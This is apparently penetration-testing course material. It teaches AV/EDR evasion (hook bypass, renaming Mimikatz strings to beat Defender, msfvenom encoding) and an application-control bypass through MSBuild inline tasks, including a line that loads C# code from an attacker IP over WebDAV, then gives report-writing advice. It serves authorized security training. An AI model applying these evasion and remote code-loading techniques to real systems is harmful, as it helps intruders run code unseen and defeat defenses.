PowerStripper, written by Brian Fehrman, is a C# executable that takes a script as an argument and generates two files: a new PowerShell script with all comments removed and a PowerShell script with all comments removed and all remaining code Base64 encoded.

The PowerSploit toolkit's Remove-Comment.ps1 module can also be used to remove all comments from a script. By default, it will output the modified script to the screen unless the output is redirected to a file.

#### References:

- PowerStripper: https://github.com/fullmetalcache/PowerStripper
- PowerSploit's Remove-Comment: https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Remove-Comment.ps1

# **Call APIs Directly to Bypass Hooks**

AV/EDR will often hook important function calls, redirecting the calls to custom code instead of the API.

- A function hook redirects execution to AV/EDR first, instead of the underlying OS
- Defensive tools will analyze the function call and block it if it appears malicious
- If we can determine the original code location, we can call that instead, bypassing the hook (and AV/EDR analysis)
- SharpBlock bypasses "EDR's active projection DLLs by preventing entry point execution" ironically through a Microsoft feature

Defensive products, especially AV/EDR, will hook important function calls and redirect the call to their code instead of the real API. This allows the tool to analyze the call and block it if it appears malicious. For example, VirtualProtect is used to change permissions on memory (read, write, execute) and is commonly used to load shellcode into memory before executing it. To do this, the memory needs first to be writable to load the shellcode, then executable to run the code. Defensive tools will hook VirtualProtect and look for requests to change memory to RWX (readable, writeable, executable) and take action, such as blocking the call or performing additional checks on the new memory.

To bypass these tools, we need to call the real API while bypassing the additional checks. To do this, we need to determine the actual load address of the DLL and the function location. There are a number of tools that can do this, including SharpBlock.

SharpBlock does a number of things to evade defensive products. Per the GitHub repository readme, it features:

- Blocks EDR DLL entry point execution, which prevents EDR hooks from being placed.
- Patchless AMSI bypass that is undetectable from scanners looking for Amsi.dll code patches at runtime.
- Host process that is replaced with an implant PE that can be loaded from disk, HTTP, or named pipe (Cobalt Strike)
- Implanted process is hidden to help evade scanners looking for hollowed processes.
- Command-line args are spoofed and implanted after process creation using a stealthy EDR detection method.
- Patchless ETW bypass.
- Blocks NtProtectVirtualMemory invocation when the callee is within the range of a blocked DLL's address space

SharpBlock is available at https://github.com/CCob/SharpBlock.

# **Bypassing Signature-Based Detections**

- Bypassing signature-based detections is usually an iterative process
- As vendors add new signatures for detections, developers need to modify code to change signatures
- When testing payloads, turn off automatic sample submission
- A bypass working on Friday may not work on Monday morning when the engagement starts

Getting a payload to work against products using signature-based detections usually involves an iterative process of building a payload, scanning it with AV, modifying the code, and rebuilding, scanning, etc. Eventually, after enough modifications, the payload will not be recognized by AV.

The techniques required to get a payload past AV detection depend on the signatures used by the particular AV being tested. Some of these techniques include:

- Modifying or removing strings output by the program (error messages, help messages, etc.)
- Modifying program function names (Mimikatz's sekurlsa, PowerSploit's Get-GPPPassword, etc.)
- Renaming all variables in scripts
- Removing all comments in scripts

AV vendors are constantly updating detections, so you must test your payloads in a lab environment before using them in an engagement. Doing so requires AV to be enabled, but we don't want to give the AV vendors any added intelligence about our payload that may prevent it from working when we need it. If the AV product has an option to disable sending samples to the vendor automatically, that setting should be enabled so your test payloads aren't sent.

If the AV does not have such a setting, it may be necessary to implement firewall rules to prevent the AV agent from speaking with vendor servers.

Finally, you'll want to make sure you test your payloads again right before you use them. A payload that goes undetected on Friday afternoon might not evade detection on Monday morning!

34

# **Bypassing Windows Defender (1)**

- DefenderCheck finds the exact bytes that cause Windows Defender to flag a payload and returns those bytes, the signature name, and the offset from the start of the file
- We can use this information to make modifications to our payload until it no longer triggers

We'll look at how to use this process to get a payload working on a system with Windows Defender. While Microsoft may have been mocked for its product security in the past, Windows Defender can be a legitimate roadblock for an attacker trying to get on a system and remain unseen. Matt Hand developed DefenderCheck to test exactly what bytes in a payload are causing Windows Defender to think the payload is malicious. We'll use this tool in an iterative process to modify the Mimikatz source code to get it running on a system with an up-to-date Windows Defender installation.

#### Reference:

• https://github.com/matterpreter/DefenderCheck

![](_page_36_Figure_0.jpeg)

To start with, we'll take the stock, unmodified Mimikatz binary and use DefenderCheck to find out if Defender thinks this binary is malicious. No surprise here. Defender has identified this as a threat specifically, "HackTool:Win64/Mikatz!dha." Here, we can see Defender is most likely triggering on something called "mimikatz\_doLocal."

![](_page_37_Figure_0.jpeg)

Looking at the source code, we can see the offending string, "mimikatz\_doLocal", shows up in two places -Mimikatz.h and Mimikatz.c. It is likely that "mimikatz" is the specific problem rather than the entire string. To test that suspicion, we'll only change "mimikatz\_doLocal", changing it to "mimidogz\_doLocal". After recompiling and retesting, we can see the next thing Defender alerted on appears to be an error string contained in the binary.

Ultimately, many changes were required to get a working payload that was undetected by Defender. These changes included changing many of the commands used to operate Mimikatz (sekurlsa, logonpasswords, credman, etc.), modifying strings used in messages produced by the application, and other changes.

![](_page_38_Figure_0.jpeg)

Eventually, after many modifications, we compiled a new Mimikatz executable that was undetected by Defender. Several of the modifications are visible here on the slide. The prompt is now "mimidogz" instead of mimikatz, and the executable has been renamed mimidogz. The command used to recover the password hash is "securelsa::loginpasswords" instead of "sekurlsa::logonpasswords". As you can see, with patience and persistence, it is usually possible to bypass signature-based detections.

![](_page_39_Picture_2.jpeg)

# **Tools for Automating AV/EDR Evasion**

- Metasploit's msfvenom is a useful option, but many AV vendors focus on detecting its output (as with other public tooling)
- Shellter is a popular commercial tool for penetration testers and red teamers to evade AV/EDR (with an older free edition available)

![](_page_39_Picture_6.jpeg)

sec560@560vm:~\$ msfvenom --list encoders Name Rank Description ---- ---- ----------- ...some encoders skipped... x64/zutto\_dekiru manual Zutto Dekiru x86/alpha\_mixed low Alpha2 Alphanumeric Mixedcase Encoder x86/shikata\_ga\_nai excellent Polymorphic XOR Additive Feedback ...

#### Application Control bypasses!

To help evade antivirus tools, you can rely on automation. In the past, antivirus evasion was often a manual effort, altering code in a hex editor or disassembler. As offensive tools evolved, new tools were created to help bypass the defensive tools.

With msfvenom, Metasploit takes a given payload, applies multiple rounds of encoding using dozens of different techniques, and creates a standalone malicious file. Although msfvenom is indeed a useful option, many antivirus vendors focus on detecting its output, given the popularity of Metasploit in the attacker community.

Therefore, it is helpful to have other options in addition to msfvenom for antivirus evasion. Shellter is one such option for larger penetration testing firms.

The game of hiding from defensive tools is very fast-paced. When a new bypass is found, the defensive tools close the holes, sometimes in weeks or even days. It is quite uncommon for a long-standing bypass to survive for long, but we have another way.

![](_page_40_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

40

# **Application Control**

- Application Control software restricts which software is allowed to be executed
- Examples:
  - − Microsoft AppLocker
  - − Carbon Black App Control (formerly CB Protection)
- Permissions are based on user or group memberships
- Software rules can be specified in multiple ways
  - − File location
  - − Hash
  - − Certificate/Signer

Application control software is designed to allow or restrict access to software based on the user's roles. In a broad sense, this is used to prevent users from running any unauthorized executable. The modern application control software allows rules to be defined based on the user and their group membership in combination with:

- File location
- File hash
- Certificate/Signer

Blocking based on location and hash is difficult since simply renaming a file or changing a single bit will bypass these defenses. Ideally, the application control software only allows approved software and denies execution of everything else. To make this easier, many of the vendors offer an "audit mode" that allows security teams to test changes before fully blocking software (and accidentally impacting production systems).

Forging a signature is largely infeasible. But what if we could use a known-good, signed executable as a springboard to run the code of our choosing?

![](_page_42_Figure_0.jpeg)

bypasses are generally much longer lasting. One of the most common techniques to execute arbitrary code is to use a known-good piece of software to launch your custom shellcode.

MSBuild.exe, part of the .NET framework, is signed by Microsoft. Obviously, no vendor is going to block Microsoft executables on a Microsoft Windows system. This executable can be used to call arbitrary C# code, which, as we will see, can be used to execute our custom shellcode.

42

# **Application Control Bypass: MSBuild (1)**

- MSBuild.exe can be used to execute arbitrary code
  - − Specifically, .NET/C#
  - − We're going to discuss inline tasks with MSBuild
- Inline tasks are a way to enrich the application-building process using code you provide
  - − This code can be arbitrary C#/.NET code
- References:
  - − https://redsiege.com/560/msbuild-tasks
  - − https://redsiege.com/560/msbuild-walkthrough

#### According to Microsoft's documentation:

"The Microsoft Build Engine is a platform for building applications. This engine, which is also known as MSBuild, provides an XML schema for a project file that controls how the build platform processes and builds software. Visual Studio uses MSBuild, but MSBuild doesn't depend on Visual Studio."

The key for our bypass is the XML file, which allows us to execute "tasks." These tasks run arbitrary C# code. This allows the developer to have a much richer build process and perform more complicated (and robust) build procedures.

See the links below for more information on creating tasks:

- https://redsiege.com/560/msbuild-tasks
- https://www.redsiege.com/560/msbuild-walkthrough

#### Reference:

• https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2019

SEC560 | Enterprise Penetration Testing

43

![](_page_44_Picture_1.jpeg)

# **Application Control Bypass: MSBuild (2)**

- You can create a basic XML file that contains your inline task code
- Once complete, invoke MSBuild.exe and provide it the path to your XML file
  - − You should see MSBuild begin, and then your code executes

```
• Evasion
<Project ToolsVersion="4.0" xmlns="http://schemas.microsof
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0
    <Task>
       <Code Type="Class" Language="cs">
       <![CDATA[
         using System;
         using System.Runtime.InteropServices;
         using Microsoft.Build.Framework;
         using Microsoft.Build.Utilities;
         public class ClassExample : Task, ITask
         {
           public override bool Execute()
           {
              Console.WriteLine("Hello SEC560!")
              return true;
           }
         }
       ]]>
       </Code>
    </Task>
  </UsingTask>
</Project>
```

The example code above shows a simple task in an XML file that is accepted by MSBuild.exe. When MSBuild is given the XML file as input, the executable will run the underlying C#. This means that the code executed here will be run under the context of MSBuild, which is signed by Microsoft. The build process will begin, then the task will be executed.

# **Application Control Bypass: MSBuild (3)**

• You do need to include the MSBuild using directives

```
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
```

• You'll also need to use the Execute method override

```
public override bool Execute()
```

```
• Evasion
<Project ToolsVersion="4.0" xmlns="http://schemas.microsof
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
         using System;
         using System.Runtime.InteropServices;
 using Microsoft.Build.Framework;
 using Microsoft.Build.Utilities;
         public class ClassExample : Task, ITask
         {
 public override bool Execute()
           {
             Console.WriteLine("Hello SEC560!")
             return true;
           }
         }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

The code is in a CDATA section in the task element. We need a few directives to load functionally that will allow us to execute our code. The two directives are:

```
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
```

We then need to create the function that will be called and will ultimately run our code. The required function definition is:

```
public override bool Execute()
```

45

# **Application Control Bypass: MSBuild (4)**

- With those additions, it's time to add the C#/.NET code you want to execute!
  - − In this example, we are printing "Hello SEC560!" to the console

```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsof
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
         using System;
         using System.Runtime.InteropServices;
         using Microsoft.Build.Framework;
         using Microsoft.Build.Utilities;
         public class ClassExample : Task, ITask
         {
           public override bool Execute()
           {
 Console.WriteLine("Hello SEC560!")
              return true;
           }
         }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Inside our function, we can now call any code we want. In the example above, we are simply printing the text "Hello SEC560!". The entire XML file is here:

```
<Project ToolsVersion="4.0" 
xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
    <Target Name="Hello">
        <ClassExample />
    </Target>
    <UsingTask
        TaskName="ClassExample"
        TaskFactory="CodeTaskFactory"
AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.
Build.Tasks.v4.0.dll">
        <Task>
            <Code Type="Class" Language="cs">
            <![CDATA[
                using System;
                using System.Runtime.InteropServices;
                using Microsoft.Build.Framework;
                using Microsoft.Build.Utilities;
                public class ClassExample : Task, ITask
                {
                    public override bool Execute()
                    {
                         Console.WriteLine("Hello SEC560!")
```

```
return true;
                      }
                  }
             ]]>
             </Code>
         </Task>
    </UsingTask>
</Project>
```

![](_page_48_Figure_0.jpeg)

To execute our code, we simply run MSBuild.exe and provide the path to our executable. In the example above, you can see the output "Hello SEC560!"

48

![](_page_49_Picture_1.jpeg)

# **Application Control Bypass: MSBuild (6)**

- With those additions, it's time to add the C#/.NET code you want to execute!
- In the previous example, we printed "Hello SEC560!" to the console
- In a pen test, we want shell!
- We can get code from msfvenom
- Sample weaponized XML file:
  - − https://redsiege.com/560/badxml

We have now demonstrated that we can execute code of our choosing. In our example, we simply printed text. In a penetration test, we will want to do much more than that. Ideally, we would like to gain remote access via our C2, such as Metasploit. We can generate a payload with msfvenom and use that shellcode to gain a shell. In fact, we will do exactly that in the upcoming lab exercise.

#### Reference:

• https://redsiege.com/560/badxml

49

# **Application Control Bypass: MSBuild (7)**

- Extra tricks that you can use with MSBuild to be a bit sneakier
  - − Copy and rename MSBuild.exe to another location (doesn't require its original name or file location)
  - − Use MSBuild's UnregisterAssembly functionality to execute your code
    - https://redsiege.com/560/msbuild2
  - − Don't want to put your malicious XML code on disk? Host it remotely!

```
<Code Type="Class" Language="cs" Source="\\11.22.33.44\webdav\calc.cs">
```

• https://redsiege.com/560/msbuild-remote

Want to be even sneakier? We could copy MSBuild.exe to a different location and change its name (this doesn't affect the signature). This means any tools specifically blocking or alerting on "msbuild.exe" will not trigger.

Additionally, instead of using a "task" to execute our code, we could use the UnregisterAssembly functionality.

One of the most common ways for penetration testers to get caught is by writing a payload to disk. We can craft the XML file to load the C# code remotely with the following line and by using our attacker IP address:

```
<Code Type="Class" Language="cs" 
Source="\\11.22.33.44\webdav\calc.cs">
```

#### References:

- https://redsiege.com/560/msbuild2
- https://redsiege.com/560/msbuild-remote

![](_page_51_Picture_0.jpeg)

![](_page_51_Picture_1.jpeg)

# **Application Control Bypass: MSBuild (8)**

- AV/EDR vendors have written signatures for the common MSBuild templates
  - − Most are based on the "3gstudent" template
- Renaming variables and functions is often enough
- Change the layout of the XML
- Use alternate functions
  - − **HeapAlloc** vs. **VirtualAlloc**
  - − **RtlMoveMemory** vs. **Marshal.Copy**

Most AV/EDR vendors have written signatures for parts of the most common MSBuild technique templates. As these are static signatures based on strings in the template, we can usually avoid detection by renaming variables and functions to random names. Even prepending "my" to each variable and function has been enough to avoid detection by many AV and EDR agents. In some cases, rearranging portions of the C# code will also help avoid detection.

If the template itself is not detected as malicious, it's possible that the techniques used to execute your shellcode may be detected. In these cases, using alternative functions may help avoid detection. While the most common templates use VirtualAlloc to allocate memory, you could use HeapCreate to create a heap object and then use HeapAllocate to allocate that heap memory. RtlMoveMemory could be used in place of Marshal.Copy to copy the shellcode into the allocated memory.

#### References:

- https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml
- https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
- https://docs.microsoft.com/en-us/windows/win32/api/heapapi/
- https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
- https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-5.0

![](_page_52_Picture_0.jpeg)

![](_page_53_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and

Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

![](_page_54_Picture_2.jpeg)

# **Always Create a Report**

- now, it will be the only evidence of the work you did
- **In-house tests**: Report is important to communicate with management and to show that you've used due diligence in securing your network
- **Write your report as you go!**
  - − Helps you to grab the right screenshots
  - − It is important to document your methodology, and that is easier to do as you go
  - − No forgetting what you've done
  - − Prevents all the pain at the end
  - − You can save the final polish for the official post-test reporting time but begin reporting during the test

Testers should always create a final report describing their work and findings. If the testers work for a third-party penetration testing or ethical hacking company, the report is the only evidence they leave behind of the project they performed. A high-quality report may be used for several years after an engagement as fixes are deployed, new architectures are considered, and new products and configurations are rolled out. Because of this potential long-term value of the report, make sure you focus on creating a

will linger and could cause significant problems in the future.

Sometimes, testers who perform vulnerability scans of their employers in-house think that they don't need to write a detailed report. After all, you're just scanning your own enterprise network to see how things look. Why waste the extra time documenting your results and findings? Even in such circumstances, we still recommend that you create a report because it helps codify the work you've done and provides an organizational memory of the value you've provided. If management doesn't provide enough time or staff resources for creating a report, work hard to convince them of its importance. A report is concrete proof that your organization is exercising its due diligence in conducting vulnerability scans on a regular (or at least sporadic) basis. If there are major security problems in the future (such as a major breach), and your organization is investigated by the government or shareholders, the vulnerability scanning reports will be helpful in showing your attempts to measure your security stance in the past.

In addition, to increase the efficiency of your overall process, you should consider starting to write the report while the test is underway. That way, your reporting process will not take as long, and the overall quality of your results will better reflect the details of your work. As you conduct the test, take notes that follow along with the documented methodology that you use. Grab screenshots that illustrate your findings as you make those findings. When you have significant results, write them up immediately (or at least a bulleted list of their most salient points) while they are still fresh in your mind. You usually don't have to finish the report while the testing is underway. Most penetration tests include a reporting period after the hands-on testing is complete. But this post-testing report time will go much more smoothly and efficiently if you start writing during the test phase.

![](_page_55_Picture_2.jpeg)

# **Don't Just Regurgitate Vuln Scan Results**

- Copying and pasting from the vuln scanner is obvious—don't do it!
- Develop your own list of findings
  - − Internal team: Findings already describe your business risk, and internal tools already in place to mitigate the risks
  - − External team: Findings are worded in your style and include customizations that need minimal tweaking
- Review the results and help interpret the risk in the context of the target
- Manually validate major findings to eliminate false positives
- You will often need to adjust the severity or risk rating

A common mistake of testers in writing reports is merely to cut and paste the output of their vulnerability scanning tools into a document and turn it in as the official report. Sometimes, they don't even format their results, simply throwing vulnerability scanner output over the wall, hoping that someone will act on it.

Stock vulnerability scanner output is obvious. Its format is canned and often not easily interpreted by nontechnical personnel. Many of the issues that are identified are false positives, and the risks and recommendations do not tie in with the target organization's business objectives.

We strongly recommend that you review the results of your vulnerability scanning tools and other techniques and then help interpret them in light of the business of the target organization. What do these vulnerabilities mean? How could they impact the business? Given a realistic threat that exploits the vulnerability, what risk does it pose? And how should fixes be prioritized, whether they be patches, configuration changes, architecture alterations, and so on?

In addition, you should strive to verify all major findings manually, especially those that are high risk. If you do not validate findings, your report may be full of false positives, which significantly lowers the value of your work and may call into question your skills and approach.

Also, note that you may need to adjust the High/Medium/Low risk indications of your vulnerability scanning tools. What Nessus or another scanner calls a High risk might be a Low risk for the target organization. Of course, the opposite is also possible. All these issues have to be addressed in the business context of the target organization.

# **Recommended Report Format**

- Executive Summary
- Introduction
- Findings sorted by risk
- Methodology
- Appendices (Optional)

This slide contains a recommended report format. Of course, you may iterate on this structure, adding or removing components. Your organization may already have a report format for penetration tests and related work. If so, get it and use it. If not, feel free to adopt this structure, reviewing it and tweaking it to meet your needs.

We recommend that the penetration testing, vulnerability assessment, or ethical hacking report include these elements:

Executive Summary: This brief up-front matter is meant for executives who may not read the full report, providing them with the most important conclusions from the work.

Introduction: This component describes the project at a high level, answering the who, where, when, and why aspects of the project.

Findings: This section presents the actual findings, listed one by one, in the target environment with detailed technical descriptions. The findings are sorted so that the most significant risk issues are discussed first.

Methodology: This part of the report describes the "what" of the project: What did the team do? It covers the process of the penetration test or ethical hacking engagement.

The report also may include optional appendices of reinforcing data and results.

Let's look at each section in more detail.

# **1. Executive Summary (1)**

- Arguably the most important part of the report
- Writing effective Exec Summaries is a vital art
- Write this last so you can best summarize the test
- Should be 1 to 1.5 pages
- Very briefly (2 to 3 sentences), summarize project − Date, goal, who, overview
- Summarize the overall risk identified during the test
- Add high-level recommendations
- Positive findings are a nice touch

![](_page_57_Figure_11.jpeg)

The Executive Summary is probably the most important section of the entire report. Composing an effective Executive Summary is quite an art form and an important one for testers to master. The purpose of this section of the report is to describe to decision-makers what the results of the report mean—and more importantly, recommendations for the actions they need to take based on its results.

Although it appears at the start of the report, we strongly recommend that you write the Executive Summary last, after you have completed the rest of the report. That way, you can properly summarize the findings and recommendations from elsewhere in the already-written body of the report.

The Executive Summary should be quite short. Ideally, it will be under one page in length and should be no more than one and a half pages. It should not get highly technical, nor should it go over every finding. It should be composed so that it can be read by itself, offering firm conclusions and advice for someone who doesn't necessarily read the rest of the document.

The Executive Summary starts with a brief description of the project in three or fewer sentences, describing the project's date and goals, as well as who participated in the project. It also provides a brief overview of what was done.

Next, the summary covers the overall risk posture of the target environment. Were major problems discovered?

Is the environment worse than expected by testers and/or the people reading the Executive Summary? Or did the test results show that the security of the target environment appeared to be sound?

![](_page_58_Picture_0.jpeg)

![](_page_58_Picture_1.jpeg)

# **1. Executive Summary (2)**

Keep the Executive Summary high-level and business-focused. Do not use technical terms!

- Include a list of 3–6 significant findings and business impact
- Discuss root causes and management-level recommendations
  - − Changes to organizational structure
  - − Altered policies or procedures
  - − Changes to technology
- Include positive findings
  - − Don't just beat them up; they are likely to have done something right
- A mediocre test with a good Executive Summary may be more valuable than a good test with a mediocre Executive Summary

And now comes the vital part of the Executive Summary: You need to explain the business impact of your findings. You can use a bulleted list of the biggest three to six findings, followed by several sentences that explain the business impact in terms of the risk for each finding. Focus on the institutional levers management can pull to change things to eliminate not just a given discovered vulnerability but the underlying reason that the vulnerability exists.

Such levers could include changing organizational structure, altering policies and procedures, adding personnel, deploying new technology, or many other possibilities.

Don't roll your eyes about this component of the report and this mindset for composing it, thinking that it is merely management fluff. Effectively communicating your results to management is critical. A mediocre test with a good Executive Summary is likely much more valuable in improving an organization's security stance than a good test with a mediocre Executive Summary. The former provides the impetus for change and improvement, whereas the latter just reinforces security vulnerabilities in the minds of technical people who, in all likelihood, know what those flaws are already.

Remember that the Executive Summary should stand alone as a document without the rest of the final report. Often, these one or two pages are split from the rest of the report and sent up a management chain.

# **2. Introduction**

The introduction should provide an overview of the test.

- Date range and time range
- Scope
- People associated with the test
  - − Testers
  - − People associated with the target who supported the testers
  - − Include name, role, and contact info: email address and phone number
- Sometimes the scope and personnel are moved to the appendix, and the introduction becomes part of the Executive Summary

Next, we move to the Introduction component of the report. This one- to three-page section provides an overview of the project so that the reader understands when the project occurred, what was included in the scope (and possibly items purposely left out of the scope, if applicable), and who participated in the test.

Include a list of people, organized in a table, that identifies the testers and the individuals associated with the target environment who supported the testers (usually those who participated in the daily/weekly debriefings).

The table should include each individual's name, role, and contact information, such as a phone number and email address. Then, provide a brief overview of the most salient findings, using language similar to that included in the Executive Summary but possibly with more technical detail.

These Introduction components of reports are immensely helpful six months after the project or later in analyzing what was tested. Many organizations frequently refer to these Introductions to determine what else in their environment needs to be tested and what needs to be retested.

![](_page_60_Picture_1.jpeg)

# **3. Findings**

Describe ease of exploitation and impact, and provide recommendations to mitigate the finding.

- Vulnerable system(s) identified by IP address (and name, if applicable)
- Risk level: Usually High, Medium, Low (possibly adding "Critical" and "Informational")
- Explain the business risk and a detailed technical description
- Customize text in light of the target's business and technical environment
- Recommendations
  - − Ideally with multiple methods of dealing with the issue
  - − Long-term and short-term fixes

And now we get to the Findings section, where the technical results are described. We recommend starting with high-risk findings, prioritized so that the highest of the high-risk issues come first. Then, move down to medium and low risk, again prioritizing each within its subsection.

For each finding, list the system(s) that exhibit the given flaw, identifying the machine by IP address and name (if you know it). Include the risk level and estimate of how easily the given issue could be exploited. The risk level is typically sorted into High, Medium, and Low, but your given organization may want to characterize risks in another fashion. Some pen testers also add "Critical" as a category above "High" risk and "Informational" as a category below "Low" risk. Then provide a two-sentence summary of the finding, again focused on the business risk to the extent that you can. For some of the lower-risk findings, the business issue may be fairly small.

We then get into the technical details. Here, we provide a description of what the flaw is and how an attacker could exploit it and cause an impact on the target organization's business. The discussion is described in technical terms, but it, again, ties back into the business risks.

And, finally, we include a Recommendation section, which should provide one or more means of remediating the discovered flaw. If there are multiple ways of addressing the issue, include them all, but point out the one most likely to match the business needs and technical environment of the target organization.

Be careful with including the successfully guessed or cracked passwords in your report because these reports are often passed around to numerous people in a target organization. Including passwords in a report that might be reused elsewhere could be a security risk, so verify with the target organization whether such information should be included in a report. Many penetration testers have a policy of describing the characteristics of cracked passwords (such as length or character set) but not including the actual passwords in the report.

In the Technical Findings section n, screenshots that illustrate the issue can be helpful in conveying a lot of information and making the results feel "real." Network diagrams can also go a long way in explaining some technical ideas.

![](_page_62_Picture_0.jpeg)

61

![](_page_62_Picture_1.jpeg)

# **Illustrating Findings with Screenshots**

Screenshots help make findings seem "real"

- Include useful screenshots that demonstrate a vulnerability
- Suggested: Copy text from CLI tools for screen readers and accessibility
  - − You can also trim down an actual command to its shorter equivalent for readability
- Focus screenshots on the most important part of the screen
  - − Don't include a giant screen dump with a bunch of useless info
  - − Zoom in … where is the "action"?
  - − If you gain command shell access, run hostname

#### **Illustrate, don't decorate!**

Each image should support the finding, not just show you did something.

Screenshots aren't just eye candy. They can help a report have its intended effect (motivating the organization to improve its security stance) because they show the success of a penetration tester's or ethical hacker's work.

When including screenshots in your reports, make sure to focus the screenshot on the issue you are illustrating in the prose of your report. Some penetration testers include giant screenshots with a lot of detail distributed around the picture, but only a small portion of the figure is actually meaningful. The crux of your screenshot could be lost amid a sea of other unimportant information in the same figure. Focus your screenshots on the action you want to show, which might be a vulnerability discovered by a scanning tool, a command shell returned by a successful exploit (often running **hostname** to show the machine's name), or other useful items.

![](_page_63_Picture_0.jpeg)

**Screenshot Elements**

• Augment screenshots with various graphical elements to help focus attention on the most important part

![](_page_63_Picture_3.jpeg)

![](_page_63_Picture_4.jpeg)

![](_page_63_Picture_5.jpeg)

Notation: Use meaningful text to illustrate a point

- Color can add a nice touch, but don't rely on it exclusively
  - − Your report will likely be printed in black and white and may even be photocopied or faxed
  - − Be aware of color blindness
- Black text on a white background is ideal (especially in terminals)

![](_page_63_Picture_11.jpeg)

SEC560 | Enterprise Penetration Testing

Screenshots should almost always be augmented with graphical clues as to where the most important information is located in the figure. Use arrows, brackets, or squares overlaid on the screenshot to focus the reader's attention on the most important information. Small textual notations can also help hammer home the point of a given element on the screen. Try not to make your screenshots too busy, however. Remember, you need to demonstrate that a given vulnerability is real, not bewilder the reader with so much obscure detail in your pictures that they will not understand.

Color can help to bring out salient points. For example, you could use red graphical elements to zoom attention on a big problem. However, keep in mind that your beautiful color report will likely be passed on to other people in the target organization via photocopying and faxes and will likely not retain the color elements you create. Thus, while color can help, don't rely on it exclusively to make your point. Make sure that there is contrast between your screenshots and your graphical elements.

Terminals shown in screenshots often work best with black characters on a white background. They are easier to see that way (especially when faxed) and require less toner from printers.

63

![](_page_64_Picture_2.jpeg)

#### **Screenshot Tools**

- Goal is to quickly and efficiently take high-quality screenshots
- Important features: Crop, Highlight, Annotate, Redact
- Photoshop and Gimp are powerful but have too many features that may get in the way

| Snagit        | •<br>US\$50: It is widely regarded as the best screen-capturing tool<br>•<br>Crosshairs mean no extra or missing pixels<br>•<br>Designed for screenshot workflow |
|---------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Flameshot     | •<br>Linux, Mac, Windows<br>•<br>Free and open-source                                                                                                            |
| Snip & Sketch | •<br>Free in the Windows App store or pre-installed with recent updates<br>•<br>Windows only                                                                     |
| Greenshot     | •<br>Windows: Free<br>•<br>Mac: US\$1.99 but missing features included in the Windows version                                                                    |

There are a number of screenshot tools that are useful when writing a report. The tools should make taking screenshots quick and easy. The tools should also include some basic functionality, such as:

- Crop
- Notation
- Highlight
- Redaction

Let's take a look at a few tools that can help us with screenshots.

Snagit is designed for screenshots and the workflow of taking, manipulating, and using the screenshots. The software operates very similarly on both Windows and macOS. Most online polls handily rank this as the best screenshot tool. It includes a number of nice features, such as the crosshairs when taking a screenshot to ensure you don't include extra pixels or miss pixels, thereby creating a slightly sloppy screenshot. The features incorporated into the application are designed for quick editing and to speed up the workflow. This is the tool used to generate the screenshots in the wiki. SnagIt is available at https://www.techsmith.com/screen-capture.html.

Flameshot is a free and open-source tool that runs on Windows, macOS, and Linux. Its feature set is similar to Snagit. Flameshot is available at flameshot.org.

Snip & Sketch is free in the Windows App Store and is installed with more recent updates to Windows. This is a great tool that may already be installed on your system!

Greenshot is a free tool for Windows. It is designed for quick screenshots and annotations. You can quickly take a screenshot, annotate it, and paste it into a report. The tool is very good, considering it's free. The Mac version of the tool costs US\$1.99 and is missing significant features that are included for free in the Windows version. Greenshot is available at getgreenshot.org.

64

# **Redaction and Transparency**

- Be very careful of transparency and blur!
- If not used properly, you could leak sensitive info
  - − Passwords and hashes
  - − Keys
  - − User information, PII, PHI
- Blackout is best but can be visually harsh
  - − Make sure the overlay is part of the image, and not just in the document
- Pixilation is good (with large pixels)
  - − Use pixel size of 1/2 font height or larger
  - − There are tools to depixelate if your pixels are too small

![](_page_65_Picture_14.jpeg)

